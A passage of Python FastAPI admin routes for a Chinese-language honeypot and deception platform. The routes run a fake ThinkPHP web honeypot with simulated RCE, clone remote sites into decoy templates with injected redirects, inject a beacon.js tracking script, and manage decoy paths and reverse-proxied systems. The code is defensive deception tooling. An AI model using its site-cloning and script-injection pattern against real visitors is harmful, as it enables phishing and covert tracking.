    return db.scalar(select(ServiceCatalog).where(ServiceCatalog.service_key == "thinkphp"))


@router.post("/admin/templates/honeypot/start")
def start_default_web_honeypot(request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    from app.services.honeypot_services import start_service

    item = _default_honeypot_row(db)
    port = item.default_port if item else 48777
    try:
        ok = start_service("thinkphp", port)
    except OSError as exc:
        return _redirect(
            f"/admin/templates{_qs(hp_err=f'启动 Web 蜜罐失败：端口 {port} 已被占用（{exc}）')}"
        )
    if not ok:
        return _redirect(f"/admin/templates{_qs(hp_err='启动 Web 蜜罐失败：服务已在运行')}")
    if item:
        item.status = "running"
        db.add(item)
        db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action="start-service",
        module="templates",
        target_type="web-honeypot",
        target_ref=f"thinkphp:{port}",
    )
    return _redirect(f"/admin/templates{_qs(hp_ok='Web 蜜罐已启动')}")


@router.post("/admin/templates/honeypot/stop")
def stop_default_web_honeypot(request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    from app.services.honeypot_services import stop_service

    stop_service("thinkphp")
    item = _default_honeypot_row(db)
    if item:
        item.status = "stopped"
        db.add(item)
        db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action="stop-service",
        module="templates",
        target_type="web-honeypot",
        target_ref="thinkphp",
    )
    return _redirect(f"/admin/templates{_qs(hp_ok='Web 蜜罐已停止（48777 整个欺骗面随之下线）')}")


@router.post("/admin/templates/honeypot/config")
async def config_default_web_honeypot(
    request: Request,
    db: Session = Depends(get_db),
):
    """Save the default web honeypot face config — same storage as the
    Web 蜜罐门面 page (surface key ``thinkphp``), so both pages stay in sync."""
    user = _require_admin(request, db)
    from app.services.surface_config import set_surface

    form = await request.form()
    config = {
        "app_name": (form.get("app_name") or "").strip() or "ThinkPHP V5.0.24",
        "slogan": (form.get("slogan") or "").strip() or "十年磨一剑 — 为API开发设计的高性能PHP框架",
        "runtime_path": (form.get("runtime_path") or "").strip() or "/var/www/html/app/runtime",
        "login_title": (form.get("login_title") or "").strip() or "内容管理后台",
        "login_page_enabled": form.get("login_page_enabled") == "on",
        "rce_simulation_enabled": form.get("rce_simulation_enabled") == "on",
    }
    set_surface(
        db,
        key="thinkphp",
        enabled=form.get("enabled") == "on",
        actor=user.username,
        config=config,
    )
    log_execution(
        db,
        actor_username=user.username,
        action="update",
        module="templates",
        target_type="web-honeypot-config",
        target_ref="thinkphp",
        detail_json={"enabled": form.get("enabled") == "on", "config_keys": sorted(config)},
    )
    return _redirect(f"/admin/templates{_qs(hp_ok='默认 Web 蜜罐配置已保存并即时生效')}")


@router.get("/admin/templates", response_class=HTMLResponse)
def admin_templates(request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    templates_query = db.scalars(select(ServiceTemplate).order_by(ServiceTemplate.name)).all()
    items = _web_template_rows(templates_query)
    nodes = db.scalars(select(Node).order_by(Node.name)).all()

    # Default web honeypot (the 48777 ThinkPHP plane hosting every bait face):
    # status from the live runtime, config from the shared thinkphp surface.
    from app.services.honeypot_services import (
        port_listening,
        running_services,
        sync_services_status,
    )
    from app.services.surface_config import (
        SURFACES,
        get_enabled_map,
        get_runtime_map,
        surface_stats,
    )

    sync_services_status(db)
    tp_row = db.scalar(select(ServiceCatalog).where(ServiceCatalog.service_key == "thinkphp"))
    tp_port = tp_row.default_port if tp_row else 48777
    runtime_map = get_runtime_map(db)
    tp_runtime = runtime_map.get("thinkphp", {})
    default_honeypot = {
        "name": tp_row.name if tp_row else "ThinkPHP Web 蜜罐",
        "port": tp_port,
        "running": bool(running_services().get("thinkphp")) or port_listening(tp_port),
        "service_status": tp_row.status if tp_row else "stopped",
        "enabled": tp_runtime.get("enabled", True),
        "config": tp_runtime.get("config", {}),
        "stats": surface_stats(db).get("thinkphp", {}),
        "faces": [
            {
                "key": meta["key"],
                "name": meta["name"],
                "enabled": get_enabled_map(db).get(meta["key"], True),
            }
            for meta in SURFACES
            if meta["key"] != "thinkphp"
        ],
    }

    # Collect deployed web-app-honeypot info from nodes
    deployed: list[dict] = []
    deployed_urls: dict[int, str] = {}  # template_id -> preview URL
    for node in nodes:
        payload = node.deployed_services_json or []
        for entry in payload:
            if not isinstance(entry, dict) or entry.get("type") != WEB_TEMPLATE_KIND:
                continue
            tpl = db.get(ServiceTemplate, node.template_id) if node.template_id else None
            listen = node.listen_address or "127.0.0.1"
            port = entry.get("deploy_port") or 8080
            route = entry.get("deploy_route") or entry.get("entry_path") or "/"
            deployed.append(
                {
                    "node_id": node.id,
                    "node_name": node.name,
                    "node_status": node.status,
                    "listen_address": listen,
                    "template_id": node.template_id,
                    "template_name": tpl.name if tpl else "已删除",
                    "web_stack": entry.get("web_stack") or "-",
                    "deploy_port": port,
                    "deploy_route": route,
                    "artifact_name": entry.get("artifact_name") or "",
                }
            )
            if node.template_id:
                deployed_urls[node.template_id] = f"http://{listen}:{port}{route}"

    qp = request.query_params
    ctx = {
        "title": "Web应用蜜罐管理",
        "current_user": user,
        "items": items,
        "nodes": nodes,
        "deployed": deployed,
        "deployed_urls": deployed_urls,
        "default_honeypot": default_honeypot,
        "hp_ok": qp.get("hp_ok", ""),
        "hp_err": qp.get("hp_err", ""),
        "clone_ok": qp.get("clone_ok", ""),
        "clone_name": qp.get("clone_name", ""),
        "clone_assets": qp.get("clone_assets", ""),
        "clone_kb": qp.get("clone_kb", ""),
        "clone_err": qp.get("clone_err", ""),
        "clone_template_id": qp.get("clone_template_id", ""),
        "clone_default_user_agent": CLONE_USER_AGENT,
        "clone_mobile_user_agent": CLONE_MOBILE_USER_AGENT,
        "clone_default_accept_language": CLONE_ACCEPT_LANGUAGE,
        "deploy_ok": qp.get("deploy_ok", ""),
        "deploy_name": qp.get("deploy_name", ""),
        "deploy_node": qp.get("deploy_node", ""),
        "deploy_port": qp.get("deploy_port", ""),
        "deploy_route": qp.get("deploy_route", ""),
        "undeploy_ok": qp.get("undeploy_ok", ""),
        "undeploy_node": qp.get("undeploy_node", ""),
        "enable_ok": qp.get("enable_ok", ""),
        "enable_name": qp.get("enable_name", ""),
        "enable_node": qp.get("enable_node", ""),
        "enable_port": qp.get("enable_port", ""),
        "enable_route": qp.get("enable_route", ""),
        "enable_err": qp.get("enable_err", ""),
        "disable_ok": qp.get("disable_ok", ""),
        "disable_name": qp.get("disable_name", ""),
        "disable_count": qp.get("disable_count", ""),
    }
    return _render(request, "admin/templates.html", ctx)


@router.post("/admin/templates")
async def create_template(
    request: Request,
    name: str = Form(...),
    web_stack: str = Form("Web 页面"),
    entry_path: str = Form("/"),
    deploy_mode: str = Form("静态页面仿真"),
    description: str = Form(""),
    template_file: UploadFile | None = File(None),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    artifact_name, artifact_path = await _save_web_template_upload(template_file)
    payload = _build_web_template_payload(
        web_stack=web_stack,
        entry_path=entry_path,
        deploy_mode=deploy_mode,
        artifact_name=artifact_name,
        artifact_path=artifact_path,
    )
    existing = db.scalar(select(ServiceTemplate).where(ServiceTemplate.name == name))
    if existing:
        existing.description = description
        existing.services_json = payload
        db.add(existing)
        action = "update"
    else:
        template = ServiceTemplate(name=name, description=description, services_json=payload)
        db.add(template)
        action = "create"
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action=action,
        module="templates",
        target_type="web-template",
        target_ref=name,
    )
    return _redirect("/admin/templates")


@router.post("/admin/templates/clone")
def clone_template(
    request: Request,
    clone_url: str = Form(...),
    name: str = Form(""),
    web_stack: str = Form("自定义页面"),
    entry_path: str = Form("/"),
    deploy_mode: str = Form("站点克隆仿真"),
    description: str = Form(""),
    clone_user_agent: str = Form(""),
    clone_accept_language: str = Form(CLONE_ACCEPT_LANGUAGE),
    clone_render_wait: int = Form(6),
    redirect_action: str = Form("fake_error"),
    redirect_url: str = Form(""),
    dismiss_popups: str = Form(""),
    db: Session = Depends(get_db),
):
    """Start clone in a background thread. Returns task_id as JSON for polling."""
    user = _require_admin(request, db)
    try:
        normalized_url = _normalize_clone_url(clone_url)
    except ValueError as exc:
        return _redirect("/admin/templates" + _qs(clone_err=str(exc)[:160]))

    # Deduplicate: if same URL is already being cloned, return existing task
    existing_tid = _clone_task_for_url(normalized_url)
    if existing_tid:
        return Response(
            content=json.dumps({"task_id": existing_tid}), media_type="application/json"
        )

    task_id = secrets.token_hex(8)
    parsed = urlsplit(normalized_url)
    domain = parsed.netloc.split("@")[-1].split(":")[0].lower() if parsed.netloc else ""
    template_name = (name.strip() or domain or "cloned-site").strip()[:120]

    # Normalize redirect action.
    rd_action = redirect_action.strip() if redirect_action else "fake_error"
    if rd_action not in ("warning", "original", "custom", "fake_error"):
        rd_action = "fake_error"
    rd_url = (redirect_url or "").strip()[:500]

    with _clone_tasks_lock:
        _clone_tasks[task_id] = {
            "stage": "排队中…",
            "percent": 0,
            "done": False,
            "error": None,
            "result": None,
            "url": normalized_url,
        }

    def _run_clone():
        ua = _normalize_clone_user_agent(clone_user_agent)
        lang = _normalize_clone_accept_language(clone_accept_language)
        wait_ms = _normalize_clone_render_wait_ms(clone_render_wait)

        def _progress_cb(stage: str, percent: int):
            _clone_update(task_id, stage=stage, percent=percent)

        inject_kwargs = {
            "redirect_action": rd_action,
            "redirect_url": rd_url,
            "source_url": normalized_url,
        }

        try:
            stored_path, assets, total_bytes = _clone_remote_site(
                normalized_url,
                user_agent=ua,
                accept_language=lang,
                render_wait_ms=wait_ms,
                _progress=_progress_cb,
                inject_kwargs=inject_kwargs,
                dismiss_modals=bool(dismiss_popups),
            )
        except (ValueError, OSError, HTTPError, URLError) as exc:
            _clone_update(task_id, stage="失败", percent=100, done=True, error=str(exc)[:160])
            return
        except Exception as exc:
            _clone_update(task_id, stage="失败", percent=100, done=True, error=str(exc)[:160])
            return

        _clone_update(task_id, stage="保存模板…", percent=92)
        artifact_name = f"cloned-{_safe_clone_slug(domain or 'site')}.html"
        asset_count = len(assets)
        payload = _build_web_template_payload(
            web_stack=web_stack,
            entry_path=entry_path,
            deploy_mode=deploy_mode,
            artifact_name=artifact_name,
            artifact_path=stored_path,
            clone_source_url=normalized_url,
            clone_asset_count=asset_count,
            clone_total_bytes=total_bytes,
            clone_user_agent=ua,
            clone_accept_language=lang,
            clone_render_wait_ms=wait_ms,
        )
        try:
            from app.core.db import SessionLocal as _SL

            with _SL() as db:
                existing = db.scalar(
                    select(ServiceTemplate).where(ServiceTemplate.name == template_name)
                )
                if existing:
                    existing.description = description or f"从 {normalized_url} 克隆"
                    existing.services_json = payload
                    db.add(existing)
                    db.flush()
                    template_id = existing.id
                    action = "update"
                else:
                    template = ServiceTemplate(
                        name=template_name,
                        description=description or f"从 {normalized_url} 克隆",
                        services_json=payload,
                    )
                    db.add(template)
                    db.flush()
                    template_id = template.id
                    action = "create"
                db.commit()
                log_execution(
                    db,
                    actor_username=user.username,
                    action=action,
                    module="templates",
                    target_type="web-template",
                    target_ref=f"{template_name} (clone from {normalized_url})",
                )
        except Exception as exc:
            _clone_update(
                task_id, stage="保存模板失败", percent=100, done=True, error=str(exc)[:160]
            )
            return

        _clone_update(
            task_id,
            stage="完成",
            percent=100,
            done=True,
            result={
                "template_name": template_name,
                "template_id": template_id,
                "asset_count": asset_count,
                "size_kb": total_bytes // 1024,
                "source_url": normalized_url,
            },
        )

    t = threading.Thread(target=_run_clone, daemon=True, name=f"clone-{task_id[:8]}")
    t.start()
    return Response(content=json.dumps({"task_id": task_id}), media_type="application/json")


@router.get("/admin/templates/clone/status/{task_id}")
def clone_status(task_id: str, request: Request, db: Session = Depends(get_db)):
    """Poll clone task progress. Returns JSON."""
    _require_user(request, db)
    with _clone_tasks_lock:
        entry = _clone_tasks.get(task_id)
    if not entry:
        return Response(
            content=json.dumps({"error": "task not found"}),
            status_code=404,
            media_type="application/json",
        )
    body = {
        "stage": entry["stage"],
        "percent": entry["percent"],
        "done": entry["done"],
        "error": entry["error"],
    }
    if entry["result"]:
        body["result"] = entry["result"]
    return Response(content=json.dumps(body, ensure_ascii=False), media_type="application/json")


@router.get("/admin/templates/{template_id}/preview")
def preview_template(template_id: int, request: Request, db: Session = Depends(get_db)):
    _require_user(request, db)
    template = db.get(ServiceTemplate, template_id)
    if not template:
        raise HTTPException(status_code=404)
    metadata = _web_template_metadata(template)
    if not metadata:
        raise HTTPException(status_code=404)
    artifact_path = metadata.get("artifact_path", "")
    if not artifact_path:
        raise HTTPException(status_code=404, detail="该模板无已上传文件")
    abs_path = (PROJECT_ROOT / artifact_path).resolve()
    if not abs_path.exists():
        raise HTTPException(status_code=404, detail="文件不存在")
    if (
        WEB_TEMPLATE_UPLOAD_ROOT.resolve() not in abs_path.parents
        and abs_path != WEB_TEMPLATE_UPLOAD_ROOT.resolve()
    ):
        raise HTTPException(status_code=403, detail="模板文件不在允许预览目录内")

    # Cloned directory: artifact_path = cloned/<dir>/index.html → redirect to static mount
    if CLONED_TEMPLATE_ROOT.resolve() in abs_path.parents:
        dir_name = abs_path.parent.name
        return RedirectResponse(url=f"/_preview/cloned/{dir_name}/index.html", status_code=302)

    if abs_path.is_dir():
        return RedirectResponse(url=f"/_preview/cloned/{abs_path.name}/index.html", status_code=302)

    if not abs_path.is_file():
        raise HTTPException(status_code=404, detail="文件不存在")

    # Single uploaded HTML → inject beacon.js for honeypot telemetry preview
    html = abs_path.read_text(encoding="utf-8", errors="replace")
    beacon_tag = '<script src="/static/beacon.js"></script>'
    if "</head>" in html:
        html = html.replace("</head>", f"  {beacon_tag}\n</head>", 1)
    elif "<body" in html:
        html = beacon_tag + "\n" + html
    return HTMLResponse(content=html)


@router.post("/admin/templates/{template_id}/deploy")
def deploy_web_template(
    template_id: int,
    request: Request,
    node_id: int = Form(...),
    deploy_port: int = Form(8080),
    deploy_route: str = Form("/"),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    template = db.get(ServiceTemplate, template_id)
    node = db.get(Node, node_id)
    if not template or not node or not _web_template_metadata(template):
        raise HTTPException(status_code=404)
    # Merge port & route into deployed payload
    deployed = (
        list(template.services_json)
        if isinstance(template.services_json, list)
        else [template.services_json]
    )
    for entry in deployed:
        if isinstance(entry, dict) and entry.get("type") == WEB_TEMPLATE_KIND:
            entry["deploy_port"] = max(1, min(65535, deploy_port))
            entry["deploy_route"] = _normalize_web_entry_path(deploy_route)
    node.template_id = template.id
    node.deployed_services_json = deployed
    node.updated_at = datetime.now(timezone.utc)
    db.add(node)
    db.commit()
    port = deployed[0].get("deploy_port", 8080) if deployed else 8080
    route = deployed[0].get("deploy_route", "/") if deployed else "/"
    artifact = deployed[0].get("artifact_path", "") if deployed else ""
    if artifact:
        register_deployed(port, route, artifact)
    log_execution(
        db,
        actor_username=user.username,
        action="deploy",
        module="templates",
        target_type="web-template",
        target_ref=f"{template.name} -> {node.name}",
    )
    return _redirect(
        f"/admin/templates?deploy_ok=1&deploy_name={template.name}&deploy_node={node.name}&deploy_port={port}&deploy_route={route}"
    )


def _find_port_route_conflict(
    db: Session,
    *,
    deploy_port: int,
    deploy_route: str,
    exclude_node_id: int | None = None,
) -> tuple[Node, dict] | None:
    """Find any node that already serves ``deploy_port`` + ``deploy_route``.

    Walks every node's ``deployed_services_json`` and returns the first
    collision (node, entry).  ``exclude_node_id`` lets the caller ignore the
    target node's own existing entries (used by re-deploy of the same
    template to the same node/port/route).
    """
    from sqlalchemy import select as _select
    from app.models.node import Node as _Node

    nodes = db.scalars(_select(_Node)).all()
    for node in nodes:
        if exclude_node_id is not None and node.id == exclude_node_id:
            continue
        for entry in node.deployed_services_json or []:
            if not isinstance(entry, dict) or entry.get("type") != WEB_TEMPLATE_KIND:
                continue
            if (
                int(entry.get("deploy_port", 0) or 0) == deploy_port
                and str(entry.get("deploy_route", "/") or "/") == deploy_route
            ):
                return node, entry
    return None


@router.post("/admin/templates/{template_id}/enable")
def enable_template(
    template_id: int,
    request: Request,
    node_id: int = Form(...),
    deploy_port: int = Form(8080),
    deploy_route: str = Form("/"),
    db: Session = Depends(get_db),
):
    """Enable a template on a node — start live serving immediately.

    Selecting a node + port + route during enable means the template is
    recorded AND live the moment the operator clicks 启用.  The
    ``Node.deployed_services_json`` list grows so multiple templates on
    the same node at different (port, route) pairs are supported.
    """
    user = _require_admin(request, db)
    template = db.get(ServiceTemplate, template_id)
    node = db.get(Node, node_id)
    if not template or not node or not _web_template_metadata(template):
        raise HTTPException(status_code=404)
    deploy_port = max(1, min(65535, deploy_port))
    deploy_route = _normalize_web_entry_path(deploy_route)

    # Reject (port, route) collisions on any other node.
    conflict = _find_port_route_conflict(db, deploy_port=deploy_port, deploy_route=deploy_route)
    if conflict is not None:
        other_node, other_entry = conflict
        return _redirect(
            "/admin/templates"
            + _qs(
                enable_err=f"端口 {deploy_port}{deploy_route} 已被节点《{other_node.name}》"
                f"上的模板《{other_entry.get('web_stack', '?')}》占用"
            )
        )

    # Reject duplicate enable on the same node (so the operator can re-enable
    # cleanly via 停用 first).  Check this AFTER the cross-node conflict.
    for entry in node.deployed_services_json or []:
        if not isinstance(entry, dict) or entry.get("type") != WEB_TEMPLATE_KIND:
            continue
        if (
            int(entry.get("deploy_port", 0) or 0) == deploy_port
            and str(entry.get("deploy_route", "/") or "/") == deploy_route
        ):
            return _redirect(
                "/admin/templates"
                + _qs(
                    enable_err=f"节点《{node.name}》的端口 {deploy_port}{deploy_route} 已被同节点的其它部署占用"
                )
            )

    # Build / append deployment entry on the target node.
    base = (
        list(template.services_json)
        if isinstance(template.services_json, list)
        else [template.services_json]
    )
    new_entry: dict | None = None
    for entry in base:
        if isinstance(entry, dict) and entry.get("type") == WEB_TEMPLATE_KIND:
            new_entry = dict(entry)
            break
    if not new_entry:
        # Template has no web-app-honeypot entry — synthesize one.
        new_entry = {
            "type": WEB_TEMPLATE_KIND,
            "web_stack": "Web 页面",
            "entry_path": "/",
            "deploy_mode": "静态页面仿真",
            "artifact_name": "",
            "artifact_path": "",
            "enabled": True,
        }
    new_entry["deploy_port"] = deploy_port
    new_entry["deploy_route"] = deploy_route
    new_entry["enabled"] = True
    new_entry["template_id"] = template.id  # internal annotation

    # Re-deploy of the same template supersedes older instances: stop the old
    # live servers and drop their entries, otherwise every clone run leaves
    # another zombie honeypot listening on a new port.
    from app.services.deployed_server import unregister_deployed

    deployed = list(node.deployed_services_json or [])
    superseded = [
        e for e in deployed
        if isinstance(e, dict) and e.get("type") == WEB_TEMPLATE_KIND
        and e.get("template_id") == template.id
        and not (
            int(e.get("deploy_port", 0) or 0) == deploy_port
            and str(e.get("deploy_route", "/") or "/") == deploy_route
        )
    ]
    for old in superseded:
        try:
            unregister_deployed(
                int(old.get("deploy_port", 0) or 0),
                str(old.get("deploy_route", "/") or "/"),
            )
        except Exception:
            pass
    if superseded:
        deployed = [
            e for e in deployed
            if e not in superseded
        ]
    deployed.append(new_entry)
    node.deployed_services_json = deployed
    # Last-write-wins FK — also helps the templates page list which node
    # currently hosts the template.
    node.template_id = template.id
    node.updated_at = datetime.now(timezone.utc)
    db.add(node)
    db.commit()

    # Bring up the live Uvicorn server for this port and register the route.
    artifact = new_entry.get("artifact_path") or ""
    if artifact:
        started = register_deployed(
            deploy_port,
            deploy_route,
            artifact,
            template_id=template.id,
            node_id=node.id,
            template_name=template.name,
        )
        if not started:
            return _redirect(
                "/admin/templates"
                + _qs(
                    error=(
                        f"部署已登记但端口 {deploy_port} 未能启动监听"
                        "（端口被占用或 artifact 缺失）— 请检查后重试"
                    )
                )
            )

    log_execution(
        db,
        actor_username=user.username,
        action="enable",
        module="templates",
        target_type="web-template",
        target_ref=f"{template.name} -> {node.name}:{deploy_port}{deploy_route}",
    )
    return _redirect(
        "/admin/templates"
        + _qs(
            enable_ok=1,
            enable_name=template.name,
            enable_node=node.name,
            enable_port=deploy_port,
            enable_route=deploy_route,
        )
    )


@router.post("/admin/templates/{template_id}/disable")
def disable_template(template_id: int, request: Request, db: Session = Depends(get_db)):
    """Stop serving a template on every node it's currently deployed to.

    The deployment record is *kept* on the node so the operator can re-enable
    with the same node/port/route via a single click.
    """
    user = _require_admin(request, db)
    template = db.get(ServiceTemplate, template_id)
    if not template or not _web_template_metadata(template):
        raise HTTPException(status_code=404)

    from sqlalchemy import select as _select
    from app.models.node import Node as _Node

    nodes = db.scalars(_select(_Node)).all()
    removed = 0
    for node in nodes:
        deployed = list(node.deployed_services_json or [])
        keep: list[dict] = []
        for entry in deployed:
            if not isinstance(entry, dict) or entry.get("type") != WEB_TEMPLATE_KIND:
                keep.append(entry)
                continue
            if entry.get("template_id") == template.id or node.template_id == template.id:
                port = int(entry.get("deploy_port", 0) or 0)
                route = str(entry.get("deploy_route", "/") or "/")
                if port:
                    unregister_deployed(port, route)
                removed += 1
            else:
                keep.append(entry)
        if len(keep) != len(deployed):
            # If the node no longer hosts any deployment, clear template_id FK.
            still_has_web = any(
                isinstance(e, dict) and e.get("type") == WEB_TEMPLATE_KIND for e in keep
            )
            if not still_has_web:
                node.template_id = None
            node.deployed_services_json = keep
            node.updated_at = datetime.now(timezone.utc)
            db.add(node)
    db.commit()

    log_execution(
        db,
        actor_username=user.username,
        action="disable",
        module="templates",
        target_type="web-template",
        target_ref=f"{template.name} (removed={removed})",
    )
    return _redirect(
        "/admin/templates" + _qs(disable_ok=1, disable_name=template.name, disable_count=removed)
    )


@router.post("/admin/templates/{template_id}/delete")
def delete_template(template_id: int, request: Request, db: Session = Depends(get_db)):
    _require_admin(request, db)
    item = db.get(ServiceTemplate, template_id)
    if not item:
        return _redirect("/admin/templates")
    return _queue_sensitive_action(
        request,
        action="delete_template",
        params={"template_id": template_id},
        return_to="/admin/templates",
        title=f"删除模板：{item.name}",
        description="模板删除后，已引用该模板的节点需要手工重新分配，请输入管理员密码确认。",
    )


@router.post("/admin/templates/{node_id}/undeploy")
def undeploy_template(node_id: int, request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    node = db.get(Node, node_id)
    if not node:
        return _redirect("/admin/templates")
    node_name = node.name
    # Unregister each deployed template from the live server
    for entry in node.deployed_services_json or []:
        if not isinstance(entry, dict) or entry.get("type") != WEB_TEMPLATE_KIND:
            continue
        p = entry.get("deploy_port", 8080)
        r = entry.get("deploy_route", entry.get("entry_path", "/"))
        unregister_deployed(p, r)
    node.template_id = None
    node.deployed_services_json = []
    node.updated_at = datetime.now(timezone.utc)
    db.add(node)
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action="undeploy",
        module="templates",
        target_type="web-template",
        target_ref=node_name,
    )
    return _redirect(f"/admin/templates?undeploy_ok=1&undeploy_node={node_name}")


@router.get("/admin/internet-systems", response_class=HTMLResponse)
def admin_internet_systems(request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    systems = db.scalars(select(InternetSystem).order_by(InternetSystem.name)).all()
    items = _internet_system_rows(systems)
    jsonp_templates = db.scalars(select(JsonpTemplate).order_by(JsonpTemplate.name)).all()
    summary = {
        "total": len(items),
        "enabled": sum(1 for item in items if item["is_enabled"]),
        "monitoring": sum(1 for item in items if item["status"] == "监测模式"),
        "protected": sum(1 for item in items if item["status"] in {"灰度注入", "反制模式"}),
        "fail_safe": sum(
            1
            for item in items
            if "旁路" in item["failover_mode"] or "放行" in item["failover_mode"]
        ),
    }
    return _render(
        request,
        "admin/internet_systems.html",
        {
            "title": "互联网系统接入",
            "current_user": user,
            "items": items,
            "summary": summary,
            "jsonp_templates": jsonp_templates,
        },
    )


@router.post("/admin/internet-systems")
def create_internet_system(
    request: Request,
    name: str = Form(...),
    domain: str = Form(...),
    upstream_url: str = Form(...),
    owner: str = Form(""),
    deploy_mode: str = Form("反向代理无损接入"),
    status: str = Form("监测模式"),
    tls_mode: str = Form("沿用原证书"),
    failover_mode: str = Form("异常自动旁路"),
    inject_policy: str = Form("仅公开页面注入"),
    decoy_policy: str = Form("蜜饵路径 + 假接口"),
    jsonp_template_key: str = Form(""),
    risk_policy: str = Form("observe"),
    tags_csv: str = Form(""),
    notes: str = Form(""),
    is_enabled: str = Form("1"),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    normalized_domain = _normalize_system_domain(domain)
    normalized_upstream = _normalize_upstream_url(upstream_url)
    if not normalized_domain or not normalized_upstream:
        raise HTTPException(status_code=400, detail="domain and upstream_url are required")
    existing = db.scalar(select(InternetSystem).where(InternetSystem.domain == normalized_domain))
    if existing:
        item = existing
        action = "update"
    else:
        item = InternetSystem(
            domain=normalized_domain,
            name=name.strip() or normalized_domain,
            upstream_url=normalized_upstream,
        )
        action = "create"
    item.name = name.strip() or normalized_domain
    item.domain = normalized_domain
    item.upstream_url = normalized_upstream
    item.owner = owner.strip()
    item.deploy_mode = deploy_mode.strip() or "反向代理无损接入"
    item.status = status.strip() or "监测模式"
    item.tls_mode = tls_mode.strip() or "沿用原证书"
    item.failover_mode = failover_mode.strip() or "异常自动旁路"
    item.inject_policy = inject_policy.strip() or "仅公开页面注入"
    item.decoy_policy = decoy_policy.strip() or "蜜饵路径 + 假接口"
    item.jsonp_template_key = jsonp_template_key.strip()
    item.risk_policy = risk_policy.strip() or "observe"
    item.tags_json = params_from_csv(tags_csv)
    item.notes = notes.strip()
    item.is_enabled = _form_bool(is_enabled)
    db.add(item)
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action=action,
        module="internet-systems",
        target_type="internet-system",
        target_ref=normalized_domain,
    )
    return _redirect("/admin/internet-systems")


@router.post("/admin/internet-systems/{system_id}/update")
def update_internet_system(
    system_id: int,
    request: Request,
    name: str = Form(...),
    domain: str = Form(...),
    upstream_url: str = Form(...),
    owner: str = Form(""),
    deploy_mode: str = Form("反向代理无损接入"),
    status: str = Form("监测模式"),
    tls_mode: str = Form("沿用原证书"),
    failover_mode: str = Form("异常自动旁路"),
    inject_policy: str = Form("仅公开页面注入"),
    decoy_policy: str = Form("蜜饵路径 + 假接口"),
    jsonp_template_key: str = Form(""),
    risk_policy: str = Form("observe"),
    tags_csv: str = Form(""),
    notes: str = Form(""),
    is_enabled: str = Form("1"),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    item = db.get(InternetSystem, system_id)
    if not item:
        raise HTTPException(status_code=404)
    normalized_domain = _normalize_system_domain(domain)
    normalized_upstream = _normalize_upstream_url(upstream_url)
    if not normalized_domain or not normalized_upstream:
        raise HTTPException(status_code=400, detail="domain and upstream_url are required")
    conflict = db.scalar(
        select(InternetSystem).where(
            InternetSystem.domain == normalized_domain, InternetSystem.id != system_id
        )
    )
    if conflict:
        raise HTTPException(status_code=400, detail="domain already exists")
    item.name = name.strip() or normalized_domain
    item.domain = normalized_domain
    item.upstream_url = normalized_upstream
    item.owner = owner.strip()
    item.deploy_mode = deploy_mode.strip() or "反向代理无损接入"
    item.status = status.strip() or "监测模式"
    item.tls_mode = tls_mode.strip() or "沿用原证书"
    item.failover_mode = failover_mode.strip() or "异常自动旁路"
    item.inject_policy = inject_policy.strip() or "仅公开页面注入"
    item.decoy_policy = decoy_policy.strip() or "蜜饵路径 + 假接口"
    item.jsonp_template_key = jsonp_template_key.strip()
    item.risk_policy = risk_policy.strip() or "observe"
    item.tags_json = params_from_csv(tags_csv)
    item.notes = notes.strip()
    item.is_enabled = _form_bool(is_enabled)
    db.add(item)
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action="update",
        module="internet-systems",
        target_type="internet-system",
        target_ref=normalized_domain,
    )
    return _redirect("/admin/internet-systems")


@router.post("/admin/internet-systems/{system_id}/toggle")
def toggle_internet_system(system_id: int, request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    item = db.get(InternetSystem, system_id)
    if not item:
        raise HTTPException(status_code=404)
    item.is_enabled = not item.is_enabled
    item.updated_at = datetime.now(timezone.utc)
    db.add(item)
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action="toggle",
        module="internet-systems",
        target_type="internet-system",
        target_ref=item.domain,
        detail_json={"enabled": item.is_enabled},
    )
    return _redirect("/admin/internet-systems")


@router.post("/admin/internet-systems/{system_id}/delete")
def delete_internet_system(system_id: int, request: Request, db: Session = Depends(get_db)):
    _require_admin(request, db)
    item = db.get(InternetSystem, system_id)
    if not item:
        return _redirect("/admin/internet-systems")
    return _queue_sensitive_action(
        request,
        action="delete_internet_system",
        params={"system_id": system_id},
        return_to="/admin/internet-systems",
        title=f"删除互联网系统接入：{item.name}",
        description="删除后该业务系统的无损接入策略、代理配置备注和灰度状态将从平台移除，请输入管理员密码确认。",
    )


@router.get("/admin/decoys", response_class=HTMLResponse)
def admin_decoys(request: Request, db: Session = Depends(get_db)):
    _require_user(request, db)
    return _redirect("/admin/payload-tracking")


DECOY_TYPE_LABELS = {
    "api_route": "API 路由蜜饵",
    "file": "文件蜜饵",
    "credential": "凭证蜜饵",
}


def _normalize_decoy_type(value: str) -> str:
    value = (value or "credential").strip()
    return value if value in DECOY_TYPE_LABELS else "credential"


def _normalize_decoy_route(value: str, fallback_name: str = "bait") -> str:
    value = (value or "").strip()
    if not value:
        slug = re.sub(r"[^a-zA-Z0-9_-]+", "-", fallback_name or "bait").strip(
            "-"
        ).lower() or secrets.token_hex(4)
        value = f"/_bait/{slug}"
    if not value.startswith("/"):
        value = "/" + value
    if not value.startswith("/_bait/") and not value.startswith("/_trap/"):
        value = "/_bait" + value
    return value


def _decoy_template_meta(item: DecoyTemplate) -> dict:
    meta = item.metadata_json or {}
    if isinstance(meta, str):
        try:
            meta = json.loads(meta)
        except json.JSONDecodeError:
            meta = {}
    return meta if isinstance(meta, dict) else {}


def _decoy_type_label(decoy_type: str) -> str:
    return DECOY_TYPE_LABELS.get(decoy_type or "credential", "凭证蜜饵")


def _latest_decoy_deployment(db: Session, template_id: int) -> DecoyDeployment | None:
    return db.scalar(
        select(DecoyDeployment)
